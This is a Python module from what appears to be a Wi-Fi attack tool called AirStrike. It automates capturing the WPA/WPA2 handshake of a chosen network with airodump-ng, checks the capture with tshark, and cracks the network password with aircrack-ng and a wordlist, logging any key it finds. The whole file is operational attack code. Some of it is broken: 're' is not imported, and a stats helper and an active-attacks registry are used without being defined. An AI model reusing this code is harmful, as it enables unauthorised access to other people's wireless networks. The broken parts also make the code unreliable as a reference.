# AirStrike/core_attacks/capture_attack.py
import os
import sys
import time
import subprocess
import threading # If your original capture_worker used threads internally (e.g., for deauth)

# --- Path Setup & Utility Imports ---
project_root = os.path.abspath(os.path.join(os.path.dirname(__file__), '..'))
if project_root not in sys.path:
    sys.path.insert(0, project_root)

try:
    from utils.network_utils import set_monitor_mode, set_managed_mode, run_with_sudo
    # If capture_attack also triggers deauth, you might import deauth_worker or a helper
    # from .deauth_attack import deauth_attack_for_handshake_capture # Example
except ImportError as e:
    print(f"ERROR (capture_attack.py): Failed to import utils or other core_attacks: {e}")
    # Define placeholders if critical imports fail, so service layer doesn't break entirely on import
    def set_monitor_mode(iface): print(f"Placeholder: set_monitor_mode({iface})"); return False
    def set_managed_mode(iface): print(f"Placeholder: set_managed_mode({iface})"); return True # Assume success for placeholder
    def run_with_sudo(cmd, timeout=30): return False, "", "Placeholder: run_with_sudo error"
    # def deauth_attack_for_handshake_capture(...): print("Placeholder: deauth_for_capture"); return None


def capture_handshake_worker(attack_id, network_params, attack_config_params, log_callback, status_callback, stop_event, app_config):
    """
    Worker for capturing WPA/WPA2 handshakes using airodump-ng.
    Also attempts to crack the handshake if a wordlist is provided.
    """
    interface = app_config.get('DEFAULT_INTERFACE', 'wlan0')
    output_base_dir = app_config.get('OUTPUT_DIR', './captures')
    default_wordlist = app_config.get('DEFAULT_WORDLIST')

    log_callback(attack_id, f"Handshake capture worker started. Interface: {interface}, Output Dir: {output_base_dir}")
    status_callback(attack_id, "initializing", 5)

    target_bssid = network_params.get('bssid')
    target_channel_str = network_params.get('channel')
    target_essid = network_params.get('essid', target_bssid) # Use BSSID if ESSID is not available

    # Config specific to handshake capture
    capture_duration_minutes = int(attack_config_params.get('duration', 5)) # Duration for airodump-ng
    wordlist_path = attack_config_params.get('wordlist', default_wordlist)
    perform_deauth_during_capture = attack_config_params.get('deauth_clients', True) # From your original JS

    if not target_bssid or not target_channel_str:
        log_callback(attack_id, "Error: Target BSSID or channel missing.")
        status_callback(attack_id, "failed", 0)
        return

    try:
        target_channel = int(target_channel_str)
    except ValueError:
        log_callback(attack_id, f"Error: Invalid channel '{target_channel_str}'. Must be an integer.")
        status_callback(attack_id, "failed", 0)
        return

    # --- Prepare Capture Environment ---
    # Create a unique directory for this capture based on BSSID and timestamp
    safe_bssid_name = target_bssid.replace(":", "-")
    timestamp_str = time.strftime("%Y%m%d-%H%M%S")
    capture_session_dir = os.path.join(output_base_dir, "handshakes", safe_bssid_name, timestamp_str)
    try:
        os.makedirs(capture_session_dir, exist_ok=True)
        log_callback(attack_id, f"Capture session directory created: {capture_session_dir}")
    except OSError as e:
        log_callback(attack_id, f"Error creating capture directory '{capture_session_dir}': {e}")
        status_callback(attack_id, "failed", 10)
        return
        
    # Filename prefix for airodump-ng (it appends -01.cap, -01.csv, etc.)
    capture_file_prefix = os.path.join(capture_session_dir, f"capture_{safe_bssid_name}")
    # The actual .cap file airodump-ng creates
    expected_cap_file = f"{capture_file_prefix}-01.cap"

    log_callback(attack_id, f"Target: {target_essid} ({target_bssid}) on Ch: {target_channel}")
    log_callback(attack_id, f"Capture duration: {capture_duration_minutes} mins. Deauth during capture: {perform_deauth_during_capture}")
    status_callback(attack_id, "preparing", 15)

    # 1. Set interface to Monitor Mode on the correct channel
    log_callback(attack_id, f"Setting '{interface}' to monitor mode on channel {target_channel}...")
    if not set_monitor_mode(interface): # This should use run_with_sudo
        log_callback(attack_id, f"Error: Failed to set '{interface}' to monitor mode.")
        status_callback(attack_id, "failed", 20)
        return
    
    # Explicitly set channel (airodump-ng also does this, but being explicit can help)
    success_ch, _, err_ch = run_with_sudo(f"iwconfig {interface} channel {target_channel}")
    if not success_ch:
        log_callback(attack_id, f"Warning: Failed to set channel {target_channel} via iwconfig. Error: {err_ch}")
    else:
        log_callback(attack_id, f"Interface '{interface}' channel set to {target_channel}.")
    
    status_callback(attack_id, "capturing", 25)

    # --- Start airodump-ng ---
    airodump_cmd = [
        "airodump-ng",
        "--bssid", target_bssid,
        "--channel", str(target_channel),
        "-w", capture_file_prefix, # Output prefix
        "--output-format", "pcap,csv,kismet,netxml", # Capture multiple formats
        interface
    ]
    log_callback(attack_id, f"Starting airodump-ng: {' '.join(['sudo'] + airodump_cmd)}")
    
    airodump_process = None
    deauth_thread = None
    handshake_found_in_cap = False

    try:
        # Prepend sudo if not already root (run_with_sudo in set_monitor_mode handles sudo for those)
        # For Popen, we need to manage sudo explicitly if the script itself isn't root,
        # but attack_service runs these workers, and run_web.py ensures root.
        # So, direct command should be fine if aircrack-ng tools are in root's PATH.
        # However, for consistency with run_with_sudo, it's safer to assume sudo might be needed.
        if os.geteuid() != 0: airodump_cmd.insert(0, 'sudo')

        airodump_process = subprocess.Popen(airodump_cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        log_callback(attack_id, f"airodump-ng started (PID: {airodump_process.pid}). Capturing for {capture_duration_minutes} minutes.")

        # --- Optional: Start Deauthentication Thread ---
        if perform_deauth_during_capture:
            log_callback(attack_id, "Starting deauthentication to encourage handshake.")
            # You'd need a deauth worker specifically for this, or adapt the main one.
            # This deauth should run in a loop for the capture duration or until stop_event.
            # For simplicity, this example doesn't fully implement the deauth thread here.
            # You would create and start a thread similar to how attack_service does.
            # Example:
            # deauth_stop_event_internal = threading.Event() # Separate stop for this deauth
            # deauth_params_for_capture = { ... }
            # deauth_thread = threading.Thread(target=deauth_attack_for_handshake_capture, args=(..., deauth_stop_event_internal))
            # deauth_thread.start()
            pass # Placeholder for deauth thread logic

        # --- Wait for capture duration or stop event ---
        start_time = time.time()
        timeout_seconds = capture_duration_minutes * 60
        
        while (time.time() - start_time) < timeout_seconds:
            if stop_event.is_set():
                log_callback(attack_id, "Stop event received during capture.")
                break
            
            # Check if handshake is already present in the .cap file periodically
            # This is an optimization to stop early if handshake is found.
            if os.path.exists(expected_cap_file):
                # Use tshark or pycapfile to check for EAPOL messages
                # Example with tshark (ensure tshark is installed)
                tshark_check_cmd = f"tshark -r {expected_cap_file} -Y \"eapol && wlan.addr == {target_bssid}\" -c 4" # Check for 4 EAPOL frames
                # print(f"DEBUG: Checking handshake: {tshark_check_cmd}")
                success_tshark, out_tshark, err_tshark = run_with_sudo(tshark_check_cmd, timeout=10)
                if success_tshark and out_tshark and "EAPOL" in out_tshark and len(out_tshark.splitlines()) >= 2: # Basic check
                    log_callback(attack_id, "Potential handshake detected in capture file. Stopping capture early.")
                    handshake_found_in_cap = True
                    break # Exit capture loop
            
            current_progress = 30 + int(((time.time() - start_time) / timeout_seconds) * 40) # Progress from 30% to 70%
            status_callback(attack_id, "capturing", current_progress)
            time.sleep(5) # Check every 5 seconds

    except FileNotFoundError:
        log_callback(attack_id, "Error: airodump-ng or tshark not found. Is aircrack-ng suite and Wireshark installed?")
        status_callback(attack_id, "failed", 22)
    except Exception as e:
        log_callback(attack_id, f"Error during airodump-ng execution: {e}")
        status_callback(attack_id, "failed", 23)
    finally:
        if airodump_process and airodump_process.poll() is None:
            log_callback(attack_id, "Terminating airodump-ng...")
            airodump_process.terminate()
            try: airodump_process.wait(timeout=5)
            except subprocess.TimeoutExpired: airodump_process.kill()
        
        # if deauth_thread and deauth_thread.is_alive():
        #     deauth_stop_event_internal.set()
        #     deauth_thread.join(timeout=5)
        #     log_callback(attack_id, "Deauthentication thread for capture stopped.")

    if stop_event.is_set():
        log_callback(attack_id, "Handshake capture stopped by user.")
        status_callback(attack_id, "stopped", 70)
    elif not os.path.exists(expected_cap_file):
        log_callback(attack_id, f"Error: Capture file '{expected_cap_file}' was not created.")
        status_callback(attack_id, "failed", 75)
    else:
        log_callback(attack_id, f"Capture phase complete. File: {expected_cap_file}")
        status_callback(attack_id, "processing_capture", 75)

        # --- Validate Handshake (again, more thoroughly if needed) ---
        # (The periodic check above is a basic one)
        # For a more robust check, parse EAPOL messages 1-4.
        # This example assumes the earlier check or a basic file existence is enough.
        if not handshake_found_in_cap: # If not found during capture, do a final check
            tshark_final_check_cmd = f"tshark -r {expected_cap_file} -Y \"eapol && wlan.addr == {target_bssid}\" -c 4"
            success_tshark_final, out_tshark_final, _ = run_with_sudo(tshark_final_check_cmd, timeout=15)
            if success_tshark_final and out_tshark_final and "EAPOL" in out_tshark_final and len(out_tshark_final.splitlines()) >=2 :
                handshake_found_in_cap = True
        
        if handshake_found_in_cap:
            log_callback(attack_id, "WPA/WPA2 Handshake confirmed in capture file.")
            update_handshakes_captured_stat(1) # Increment global stat (example)
            status_callback(attack_id, "cracking", 80)

            # --- Attempt to Crack Handshake ---
            if not os.path.exists(wordlist_path):
                log_callback(attack_id, f"Error: Wordlist '{wordlist_path}' not found. Skipping crack attempt.")
                status_callback(attack_id, "completed_no_crack", 100)
            else:
                log_callback(attack_id, f"Attempting to crack handshake using wordlist: {wordlist_path}")
                aircrack_cmd = [
                    "aircrack-ng",
                    "-w", wordlist_path,
                    "-b", target_bssid,
                    expected_cap_file
                ]
                # run_with_sudo will prepend sudo if needed
                crack_success, crack_stdout, crack_stderr = run_with_sudo(" ".join(aircrack_cmd), timeout=app_config.get('DEFAULT_ATTACK_TIMEOUT', 600))

                log_callback(attack_id, f"Aircrack-ng Output:\n{crack_stdout}")
                if crack_stderr:
                    log_callback(attack_id, f"Aircrack-ng Error Output:\n{crack_stderr}")

                if "KEY FOUND!" in crack_stdout:
                    found_key_match = re.search(r"KEY FOUND!\s*\[\s*(.*?)\s*\]", crack_stdout)
                    found_key = found_key_match.group(1) if found_key_match else "Error parsing key"
                    log_callback(attack_id, f"SUCCESS: Password found! -> {found_key}")
                    status_callback(attack_id, "completed_cracked", 100)
                    # Store found key somewhere if needed
                elif "No matching network found" in crack_stdout or "Passphrase not in dictionary" in crack_stdout :
                    log_callback(attack_id, "INFO: Password not found in the current wordlist.")
                    status_callback(attack_id, "completed_not_cracked", 100)
                elif not crack_success:
                    log_callback(attack_id, f"Aircrack-ng failed or was interrupted. Stderr: {crack_stderr}")
                    status_callback(attack_id, "failed_crack_attempt", 95)
                else: # Aircrack ran but didn't find key and no clear error
                    log_callback(attack_id, "Aircrack-ng finished. Password not found or other issue.")
                    status_callback(attack_id, "completed_not_cracked", 100)
        else:
            log_callback(attack_id, "No valid WPA/WPA2 handshake captured.")
            status_callback(attack_id, "failed_no_handshake", 100)

    # --- Final Cleanup ---
    log_callback(attack_id, f"Restoring interface '{interface}' to managed mode.")
    if not set_managed_mode(interface):
        log_callback(attack_id, f"Warning: Failed to restore '{interface}' to managed mode.")
    
    # Ensure a final status is set if not already completed/failed/stopped
    current_status = _active_attacks.get(attack_id, {}).get('status', 'unknown') if '_active_attacks' in globals() else 'unknown'
    if current_status not in ["completed", "completed_cracked", "completed_not_cracked", "completed_no_crack", "failed", "failed_no_handshake", "failed_crack_attempt", "stopped"]:
        status_callback(attack_id, "completed_unknown_outcome", 100)
    log_callback(attack_id, "Handshake capture worker finished.")

